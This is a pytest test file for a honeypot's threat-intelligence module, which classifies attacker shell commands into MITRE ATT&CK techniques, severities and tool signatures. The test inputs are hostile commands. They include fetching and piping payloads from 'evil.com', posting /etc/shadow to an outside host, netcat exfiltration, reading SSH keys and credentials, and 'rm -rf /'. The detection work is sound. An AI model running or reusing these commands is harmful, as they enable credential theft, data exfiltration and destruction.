"""
CI/CDecoy — CTI Enrichment Tests

Tests for the enrichment logic that classifies attacker commands
into MITRE ATT&CK techniques, assigns severity, and detects tools.
Imports from cti/enrichment.py — no DB or NATS required.
"""


from unittest.mock import MagicMock

from enrichment import (
    TOOL_CATEGORIES,
    TOOL_SIGNATURES,
    _is_private_ip,
    _target_severity_boost,
    classify_command,
    detect_dangerous_progressions,
    detect_kill_chain,
    enrich_event,
    geoip_enrich,
)

# ══════════════════════════════════════════════════════
#  EXISTING TESTS (preserved verbatim)
# ══════════════════════════════════════════════════════


class TestMITREClassification:

    def test_whoami(self):
        result = classify_command("whoami")
        assert any(t["technique_id"] == "T1033" for t in result["mitre_techniques"])

    def test_etc_shadow(self):
        result = classify_command("cat /etc/shadow")
        assert any(t["technique_id"] == "T1003.008" for t in result["mitre_techniques"])
        assert result["severity"] == "high"

    def test_uname(self):
        result = classify_command("uname -a")
        techs = result["mitre_techniques"]
        assert any(t["technique_id"] == "T1082" for t in techs)
        assert any(t["tactic"] == "discovery" for t in techs)

    def test_wget_tool_transfer(self):
        result = classify_command("wget http://evil.com/payload.sh")
        assert any(t["technique_id"] == "T1105" for t in result["mitre_techniques"])
        assert result["severity"] == "high"

    def test_ssh_lateral(self):
        result = classify_command("ssh root@10.0.0.5")
        techs = result["mitre_techniques"]
        assert any(t["technique_id"] == "T1021.004" for t in techs)
        assert any(t["tactic"] == "lateral-movement" for t in techs)

    def test_private_key_access(self):
        result = classify_command("cat /root/.ssh/id_rsa")
        assert any(t["technique_id"] == "T1552.004" for t in result["mitre_techniques"])

    def test_tar_archive(self):
        result = classify_command("tar czf /tmp/loot.tar.gz /etc")
        assert any(t["technique_id"] == "T1560.001" for t in result["mitre_techniques"])

    def test_crontab_persistence(self):
        result = classify_command("crontab -e")
        assert any(t["technique_id"] == "T1053.003" for t in result["mitre_techniques"])
        assert result["severity"] == "medium"

    def test_python_execution(self):
        result = classify_command("python3 -c 'import os; os.system(\"id\")'")
        assert any(t["technique_id"] == "T1059.006" for t in result["mitre_techniques"])

    def test_benign_command(self):
        result = classify_command("echo hello world")
        assert result["mitre_techniques"] == []
        assert result["severity"] == "info"

    def test_ls_root_home(self):
        result = classify_command("ls -la /root")
        assert any(t["technique_id"] == "T1083" for t in result["mitre_techniques"])

    def test_multi_technique_command(self):
        """A pipe chain can trigger multiple techniques."""
        result = classify_command("cat /etc/passwd | grep root")
        techs = result["mitre_techniques"]
        tech_ids = [t["technique_id"] for t in techs]
        assert "T1003.008" in tech_ids

    def test_no_duplicate_technique_ids(self):
        result = classify_command("whoami && id && whoami")
        tech_ids = [t["technique_id"] for t in result["mitre_techniques"]]
        assert len(tech_ids) == len(set(tech_ids))


class TestSeverityClassification:

    def test_discovery_is_low(self):
        result = classify_command("hostname")
        assert result["severity"] == "low"

    def test_credential_access_is_high(self):
        result = classify_command("cat /etc/shadow")
        assert result["severity"] == "high"

    def test_c2_is_high(self):
        result = classify_command("curl http://evil.com/shell.sh")
        assert result["severity"] == "high"

    def test_no_match_is_info(self):
        result = classify_command("clear")
        assert result["severity"] == "info"

    def test_highest_severity_wins(self):
        """If command matches both low and high, take high."""
        result = classify_command("cat /etc/shadow && hostname")
        assert result["severity"] == "high"


class TestToolDetection:

    def test_nmap_detected(self):
        result = classify_command("nmap -sV 10.0.0.0/24")
        assert "nmap" in result["tool_signatures"]

    def test_hydra_detected(self):
        result = classify_command("hydra -l admin -P passwords.txt ssh://target")
        assert "hydra" in result["tool_signatures"]

    def test_linpeas_detected(self):
        result = classify_command("./linpeas.sh")
        assert "linpeas" in result["tool_signatures"]

    def test_no_false_positive(self):
        result = classify_command("echo normal command")
        assert result["tool_signatures"] == []


class TestKillChainDetection:

    def test_single_phase_not_kill_chain(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1033", "tactic": "discovery"},
        ]
        detected, phases = detect_kill_chain(techniques)
        assert detected is False
        assert phases == ["discovery"]

    def test_two_phases_not_kill_chain(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
        ]
        detected, _ = detect_kill_chain(techniques)
        assert detected is False

    def test_three_phases_is_kill_chain(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
            {"technique_id": "T1021.004", "tactic": "lateral-movement"},
        ]
        detected, phases = detect_kill_chain(techniques)
        assert detected is True
        assert len(phases) == 3

    def test_full_chain(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
            {"technique_id": "T1059.004", "tactic": "execution"},
            {"technique_id": "T1021.004", "tactic": "lateral-movement"},
            {"technique_id": "T1560.001", "tactic": "collection"},
        ]
        detected, phases = detect_kill_chain(techniques)
        assert detected is True
        assert len(phases) == 5

    def test_deduplicates_phases(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1033", "tactic": "discovery"},
            {"technique_id": "T1083", "tactic": "discovery"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
            {"technique_id": "T1105", "tactic": "command-and-control"},
        ]
        detected, phases = detect_kill_chain(techniques)
        assert detected is True
        assert phases.count("discovery") == 1

    def test_empty_techniques(self):
        detected, phases = detect_kill_chain([])
        assert detected is False
        assert phases == []

    def test_unknown_tactics_ignored(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T9999", "tactic": "made-up-tactic"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
        ]
        detected, _ = detect_kill_chain(techniques)
        assert detected is False  # only 2 valid phases


# ══════════════════════════════════════════════════════
#  NEW TESTS — Privilege Escalation
# ══════════════════════════════════════════════════════


class TestPrivilegeEscalation:

    def test_sudo_detected(self):
        result = classify_command("sudo -l")
        assert any(t["technique_id"] == "T1548.003" for t in result["mitre_techniques"])
        assert any(t["tactic"] == "privilege-escalation" for t in result["mitre_techniques"])

    def test_sudo_su(self):
        result = classify_command("sudo su")
        assert any(t["technique_id"] == "T1548.003" for t in result["mitre_techniques"])

    def test_sudo_bash(self):
        result = classify_command("sudo bash")
        assert any(t["technique_id"] == "T1548.003" for t in result["mitre_techniques"])

    def test_chmod_suid(self):
        result = classify_command("chmod u+s /tmp/exploit")
        assert any(t["technique_id"] == "T1548.001" for t in result["mitre_techniques"])

    def test_chmod_4755(self):
        result = classify_command("chmod 4755 /tmp/backdoor")
        assert any(t["technique_id"] == "T1548.001" for t in result["mitre_techniques"])

    def test_find_suid_4000(self):
        result = classify_command("find / -perm -4000 -type f")
        assert any(t["technique_id"] == "T1548.001" for t in result["mitre_techniques"])

    def test_find_suid_u_eq_s(self):
        result = classify_command("find / -perm -u=s -type f 2>/dev/null")
        assert any(t["technique_id"] == "T1548.001" for t in result["mitre_techniques"])


# ══════════════════════════════════════════════════════
#  NEW TESTS — Obfuscation / Encoding
# ══════════════════════════════════════════════════════


class TestObfuscation:

    def test_base64_pipe_bash(self):
        result = classify_command("echo aWQK | base64 -d | bash")
        assert any(t["technique_id"] == "T1027" for t in result["mitre_techniques"])

    def test_base64_decode_pipe_sh(self):
        result = classify_command("curl http://evil.com/p | base64 --decode | sh")
        assert any(t["technique_id"] == "T1027" for t in result["mitre_techniques"])

    def test_base64_decode_standalone(self):
        result = classify_command("base64 -d payload.txt")
        assert any(t["technique_id"] == "T1140" for t in result["mitre_techniques"])

    def test_xxd_reverse(self):
        result = classify_command("xxd -r hex.txt")
        assert any(t["technique_id"] == "T1140" for t in result["mitre_techniques"])

    def test_openssl_base64_decode(self):
        result = classify_command("openssl base64 -d -in encoded.txt")
        assert any(t["technique_id"] == "T1140" for t in result["mitre_techniques"])


# ══════════════════════════════════════════════════════
#  NEW TESTS — SSH Tunneling
# ══════════════════════════════════════════════════════


class TestSSHTunneling:

    def test_local_forward(self):
        result = classify_command("ssh -L 8080:internal:80 user@jump")
        assert any(t["technique_id"] == "T1572" for t in result["mitre_techniques"])

    def test_remote_forward(self):
        result = classify_command("ssh -R 9090:localhost:22 user@external")
        assert any(t["technique_id"] == "T1572" for t in result["mitre_techniques"])

    def test_dynamic_socks(self):
        result = classify_command("ssh -D 1080 user@proxy")
        assert any(t["technique_id"] == "T1572" for t in result["mitre_techniques"])

    def test_tunnel_also_matches_lateral(self):
        """SSH -L should also match T1021.004 (SSH lateral movement)."""
        result = classify_command("ssh -L 8080:i:80 user@jump")
        assert any(t["technique_id"] == "T1021.004" for t in result["mitre_techniques"])


# ══════════════════════════════════════════════════════
#  NEW TESTS — Credential Searching
# ══════════════════════════════════════════════════════


class TestCredentialSearching:

    def test_grep_password(self):
        result = classify_command("grep -rni password /etc/")
        assert any(t["technique_id"] == "T1552.001" for t in result["mitre_techniques"])

    def test_grep_akia(self):
        result = classify_command("grep -r AKIA /home/")
        assert any(t["technique_id"] == "T1552.001" for t in result["mitre_techniques"])

    def test_grep_secret(self):
        result = classify_command("grep -r secret /var/www/")
        assert any(t["technique_id"] == "T1552.001" for t in result["mitre_techniques"])

    def test_grep_api_key(self):
        result = classify_command("grep -r api_key /opt/")
        assert any(t["technique_id"] == "T1552.001" for t in result["mitre_techniques"])

    def test_bash_history(self):
        result = classify_command("cat ~/.bash_history")
        assert any(t["technique_id"] == "T1552.003" for t in result["mitre_techniques"])

    def test_root_bash_history(self):
        result = classify_command("cat /root/.bash_history")
        assert any(t["technique_id"] == "T1552.003" for t in result["mitre_techniques"])

    def test_cloud_metadata(self):
        result = classify_command("curl http://169.254.169.254/latest/meta-data/")
        assert any(t["technique_id"] == "T1552.005" for t in result["mitre_techniques"])


# ══════════════════════════════════════════════════════
#  NEW TESTS — Environment Harvesting
# ══════════════════════════════════════════════════════


class TestEnvHarvesting:

    def test_env(self):
        result = classify_command("env")
        assert any(t["technique_id"] == "T1082" for t in result["mitre_techniques"])

    def test_printenv(self):
        result = classify_command("printenv")
        assert any(t["technique_id"] == "T1082" for t in result["mitre_techniques"])


# ══════════════════════════════════════════════════════
#  NEW TESTS — Timestomping
# ══════════════════════════════════════════════════════


class TestTimestomping:

    def test_touch_timestamp(self):
        result = classify_command("touch -t 202001010000 /tmp/backdoor")
        assert any(t["technique_id"] == "T1070.006" for t in result["mitre_techniques"])
        assert any(t["tactic"] == "defense-evasion" for t in result["mitre_techniques"])


# ══════════════════════════════════════════════════════
#  NEW TESTS — Exfiltration
# ══════════════════════════════════════════════════════


class TestExfiltration:

    def test_aws_s3_cp(self):
        result = classify_command("aws s3 cp /data/dump.sql s3://exfil/")
        assert any(t["technique_id"] == "T1567" for t in result["mitre_techniques"])
        assert result["severity"] == "critical"

    def test_curl_post_exfil(self):
        result = classify_command("curl -X POST -d @/etc/shadow http://evil.com/")
        assert any(t["technique_id"] == "T1041" for t in result["mitre_techniques"])

    def test_nc_redirect(self):
        result = classify_command("nc 10.0.0.1 4444 < /etc/shadow")
        assert any(t["technique_id"] == "T1048" for t in result["mitre_techniques"])


# ══════════════════════════════════════════════════════
#  NEW TESTS — Impact
# ══════════════════════════════════════════════════════


class TestImpact:

    def test_rm_rf_root(self):
        result = classify_command("rm -rf /")
        assert any(t["technique_id"] == "T1485" for t in result["mitre_techniques"])
        assert result["severity"] == "critical"

    def test_shred(self):
        result = classify_command("shred -vfz /var/log/auth.log")
        assert any(t["technique_id"] == "T1485" for t in result["mitre_techniques"])

    def test_service_stop(self):
        result = classify_command("systemctl stop sshd")
        assert any(t["technique_id"] == "T1489" for t in result["mitre_techniques"])

    def test_kill_9(self):
        result = classify_command("kill -9 1234")
        assert any(t["technique_id"] == "T1489" for t in result["mitre_techniques"])


# ══════════════════════════════════════════════════════
#  NEW TESTS — Tool-to-Technique Bridging
# ══════════════════════════════════════════════════════


class TestToolTechniqueBridging:

    def test_nmap_technique_and_signature(self):
        """nmap should produce both T1046 technique AND tool signature."""
        result = classify_command("nmap -sV 10.0.0.1")
        assert any(t["technique_id"] == "T1046" for t in result["mitre_techniques"])
        assert "nmap" in result["tool_signatures"]

    def test_hydra_technique_and_signature(self):
        """hydra should produce both T1110 technique AND tool signature."""
        result = classify_command("hydra -l admin -P pass.txt ssh://target")
        assert any(t["technique_id"] == "T1110" for t in result["mitre_techniques"])
        assert "hydra" in result["tool_signatures"]


# ══════════════════════════════════════════════════════
#  NEW TESTS — Multi-Factor Severity
# ══════════════════════════════════════════════════════


class TestMultiFactorSeverity:

    def test_technique_override_higher_than_tactic(self):
        """T1027 (obfuscation) in execution tactic should get 'high' from override,
        not 'medium' from the execution tactic default."""
        result = classify_command("echo aWQK | base64 -d | bash")
        assert result["severity"] == "high"

    def test_target_boost_elevates_severity(self):
        """Command touching /etc/shadow should be boosted to at least high."""
        assert _target_severity_boost("cat /etc/shadow") == "high"
        assert _target_severity_boost("cat /etc/hostname") == "info"

    def test_c2_tool_boosts_to_critical(self):
        """C2 framework detection should boost severity to critical."""
        result = classify_command("msfconsole -q")
        assert result["severity"] == "critical"

    def test_exfiltration_is_critical(self):
        result = classify_command("aws s3 cp /data/x s3://bucket/")
        assert result["severity"] == "critical"

    def test_data_destruction_is_critical(self):
        result = classify_command("rm -rf /")
        assert result["severity"] == "critical"

    def test_suid_chmod_is_high(self):
        """T1548.001 override should give 'high' instead of priv-esc default."""
        result = classify_command("chmod u+s /tmp/exploit")
        assert result["severity"] == "high"


# ══════════════════════════════════════════════════════
#  NEW TESTS — Expanded Tool Signatures
# ══════════════════════════════════════════════════════


class TestExpandedTools:

    def test_metasploit_msfconsole(self):
        result = classify_command("msfconsole -q")
        assert "metasploit" in result["tool_signatures"]

    def test_meterpreter(self):
        result = classify_command("upload meterpreter.exe")
        assert "metasploit" in result["tool_signatures"]

    def test_cobalt_strike(self):
        result = classify_command("cobaltstrike beacon")
        assert "cobalt-strike" in result["tool_signatures"]

    def test_impacket(self):
        result = classify_command("secretsdump.py domain/admin@target")
        assert "impacket" in result["tool_signatures"]

    def test_bloodhound(self):
        result = classify_command("bloodhound-python -d domain.local")
        assert "bloodhound" in result["tool_signatures"]

    def test_rclone(self):
        result = classify_command("rclone copy /data remote:bucket")
        assert "rclone" in result["tool_signatures"]

    def test_sliver(self):
        result = classify_command("sliver")
        assert "sliver" in result["tool_signatures"]

    def test_crackmapexec(self):
        result = classify_command("crackmapexec smb 10.0.0.0/24")
        assert "crackmapexec" in result["tool_signatures"]

    def test_proxychains(self):
        result = classify_command("proxychains nmap 10.0.0.1")
        assert "proxychains" in result["tool_signatures"]

    def test_tool_categories_exist(self):
        """Every tool in TOOL_SIGNATURES should have a category."""
        for _, tool_name in TOOL_SIGNATURES:
            assert tool_name in TOOL_CATEGORIES, f"Missing category for tool: {tool_name}"


# ══════════════════════════════════════════════════════
#  NEW TESTS — Dangerous Progressions
# ══════════════════════════════════════════════════════


class TestDangerousProgressions:

    def test_discovery_cred_lateral(self):
        phases = {"discovery", "credential-access", "lateral-movement"}
        results = detect_dangerous_progressions(phases)
        assert len(results) > 0
        assert any(sev == "critical" for sev, _ in results)

    def test_privesc_cred_lateral(self):
        phases = {"privilege-escalation", "credential-access", "lateral-movement"}
        results = detect_dangerous_progressions(phases)
        assert len(results) > 0

    def test_discovery_privesc_persistence(self):
        phases = {"discovery", "privilege-escalation", "persistence"}
        results = detect_dangerous_progressions(phases)
        assert len(results) > 0

    def test_no_match(self):
        phases = {"discovery"}
        results = detect_dangerous_progressions(phases)
        assert results == []


# ══════════════════════════════════════════════════════
#  NEW TESTS — Account Creation
# ══════════════════════════════════════════════════════


class TestAccountCreation:

    def test_useradd(self):
        result = classify_command("useradd -m attacker")
        assert any(t["technique_id"] == "T1136" for t in result["mitre_techniques"])

    def test_adduser(self):
        result = classify_command("adduser hacker")
        assert any(t["technique_id"] == "T1136" for t in result["mitre_techniques"])


# ══════════════════════════════════════════════════════
#  NEW TESTS — enrich_event contract
# ══════════════════════════════════════════════════════


class TestEnrichEvent:

    def test_returns_five_keys(self):
        result = enrich_event({"data": {"command": "whoami"}})
        assert set(result.keys()) == {"mitre_techniques", "tool_signatures", "severity", "tags", "geo"}

    def test_json_string_data(self):
        """enrich_event should handle data as a dict."""
        result = enrich_event({"data": {"command": "cat /etc/shadow"}})
        assert any(t["technique_id"] == "T1003.008" for t in result["mitre_techniques"])

    def test_raw_data_fallback(self):
        result = enrich_event({"raw_data": {"command": "uname -a"}})
        assert any(t["technique_id"] == "T1082" for t in result["mitre_techniques"])

    def test_empty_command(self):
        result = enrich_event({"data": {"command": ""}})
        assert result["mitre_techniques"] == []

    def test_severity_from_event(self):
        """If enrichment finds nothing, fall back to event's severity."""
        result = enrich_event({"data": {"command": "", "severity": "medium"}})
        assert result["severity"] == "medium"

    def test_tool_signatures_are_flat_strings(self):
        """Critical: tool_signatures must be a flat list of strings."""
        result = enrich_event({"data": {"command": "nmap 10.0.0.1"}})
        for sig in result["tool_signatures"]:
            assert isinstance(sig, str)

    def test_geo_key_present(self):
        """enrich_event must always include a 'geo' key."""
        result = enrich_event({"data": {"command": "whoami"}})
        assert "geo" in result
        assert isinstance(result["geo"], dict)


# ══════════════════════════════════════════════════════
#  NEW TESTS — GeoIP Enrichment
# ══════════════════════════════════════════════════════

class TestGeoIPPrivateIPs:
    """Private/reserved IPs should be labelled, not looked up."""

    def test_rfc1918_10(self):
        result = geoip_enrich("10.0.0.1")
        assert result == {"private": True}

    def test_rfc1918_172(self):
        result = geoip_enrich("172.16.5.1")
        assert result == {"private": True}

    def test_rfc1918_192(self):
        result = geoip_enrich("192.168.1.1")
        assert result == {"private": True}

    def test_loopback(self):
        result = geoip_enrich("127.0.0.1")
        assert result == {"private": True}

    def test_ipv6_loopback(self):
        result = geoip_enrich("::1")
        assert result == {"private": True}

    def test_link_local(self):
        result = geoip_enrich("169.254.1.1")
        assert result == {"private": True}

    def test_empty_string(self):
        result = geoip_enrich("")
        assert result == {}

    def test_invalid_ip(self):
        """Unparseable strings are treated as private (non-routable)."""
        result = geoip_enrich("not-an-ip")
        assert result == {"private": True}


class TestIsPrivateIP:

    def test_public_ip(self):
        assert _is_private_ip("8.8.8.8") is False

    def test_private_ip(self):
        assert _is_private_ip("10.1.2.3") is True

    def test_garbage(self):
        assert _is_private_ip("xyz") is True


class TestGeoIPWithMockReader:
    """Test GeoIP enrichment with a mocked geoip2 reader."""

    def test_successful_lookup(self):
        """Mock a full city lookup and verify extracted fields."""
        mock_response = MagicMock()
        mock_response.country.iso_code = "DE"
        mock_response.country.name = "Germany"
        mock_response.city.name = "Berlin"
        mock_response.location.latitude = 52.5200
        mock_response.location.longitude = 13.4050

        mock_reader = MagicMock()
        mock_reader.city.return_value = mock_response
        # ASN lookup raises (City DB doesn't have ASN)
        mock_reader.asn.side_effect = Exception("not supported")

        import enrichment as enr
        original_reader = enr._geoip_reader
        original_attempted = enr._geoip_init_attempted
        try:
            enr._geoip_reader = mock_reader
            enr._geoip_init_attempted = True

            result = geoip_enrich("8.8.8.8")
            assert result["country"] == "DE"
            assert result["country_name"] == "Germany"
            assert result["city"] == "Berlin"
            assert result["latitude"] == 52.5200
            assert result["longitude"] == 13.4050
            # ASN fields should be absent (lookup failed gracefully)
            assert "asn" not in result
        finally:
            enr._geoip_reader = original_reader
            enr._geoip_init_attempted = original_attempted

    def test_address_not_found(self):
        """AddressNotFoundError should return empty dict, not crash."""

        class AddressNotFoundError(Exception):
            pass

        mock_reader = MagicMock()
        mock_reader.city.side_effect = AddressNotFoundError("not found")

        import enrichment as enr
        original_reader = enr._geoip_reader
        original_attempted = enr._geoip_init_attempted
        try:
            enr._geoip_reader = mock_reader
            enr._geoip_init_attempted = True

            result = geoip_enrich("93.184.216.34")
            assert result == {}
        finally:
            enr._geoip_reader = original_reader
            enr._geoip_init_attempted = original_attempted

    def test_with_asn(self):
        """When ASN lookup succeeds, asn and org fields are included."""
        mock_city = MagicMock()
        mock_city.country.iso_code = "US"
        mock_city.country.name = "United States"
        mock_city.city.name = "San Francisco"
        mock_city.location.latitude = 37.7749
        mock_city.location.longitude = -122.4194

        mock_asn = MagicMock()
        mock_asn.autonomous_system_number = 13335
        mock_asn.autonomous_system_organization = "Cloudflare, Inc."

        mock_reader = MagicMock()
        mock_reader.city.return_value = mock_city
        mock_reader.asn.return_value = mock_asn

        import enrichment as enr
        original_reader = enr._geoip_reader
        original_attempted = enr._geoip_init_attempted
        try:
            enr._geoip_reader = mock_reader
            enr._geoip_init_attempted = True

            result = geoip_enrich("1.1.1.1")
            assert result["asn"] == 13335
            assert result["org"] == "Cloudflare, Inc."
        finally:
            enr._geoip_reader = original_reader
            enr._geoip_init_attempted = original_attempted


class TestGeoIPDatabaseUnavailable:
    """When the GeoIP database file is missing, enrichment degrades gracefully."""

    def test_no_database_returns_empty(self):
        """With no reader available, public IPs get empty geo dict."""
        import enrichment as enr
        original_reader = enr._geoip_reader
        original_attempted = enr._geoip_init_attempted
        try:
            enr._geoip_reader = None
            enr._geoip_init_attempted = True  # skip re-init

            result = geoip_enrich("8.8.8.8")
            assert result == {}
        finally:
            enr._geoip_reader = original_reader
            enr._geoip_init_attempted = original_attempted

    def test_private_ip_still_labelled_without_db(self):
        """Private IP detection does not depend on the GeoIP database."""
        import enrichment as enr
        original_reader = enr._geoip_reader
        original_attempted = enr._geoip_init_attempted
        try:
            enr._geoip_reader = None
            enr._geoip_init_attempted = True

            result = geoip_enrich("10.0.0.1")
            assert result == {"private": True}
        finally:
            enr._geoip_reader = original_reader
            enr._geoip_init_attempted = original_attempted


class TestGeoIPPipelineIntegration:
    """Verify GeoIP enrichment is wired into enrich_event."""

    def test_enrich_event_includes_geo_for_private_ip(self):
        """Events with private source IPs get geo={'private': True}."""
        result = enrich_event({
            "data": {"command": "whoami", "client_ip": "192.168.1.100"},
        })
        assert result["geo"] == {"private": True}

    def test_enrich_event_geo_empty_without_ip(self):
        """Events with no source IP get an empty geo dict."""
        result = enrich_event({"data": {"command": "whoami"}})
        assert result["geo"] == {}

    def test_enrich_event_geo_with_source_ip_fallback(self):
        """source_ip in the raw event is used when client_ip is absent."""
        result = enrich_event({
            "source_ip": "10.0.0.5",
            "data": {"command": "id"},
        })
        assert result["geo"] == {"private": True}
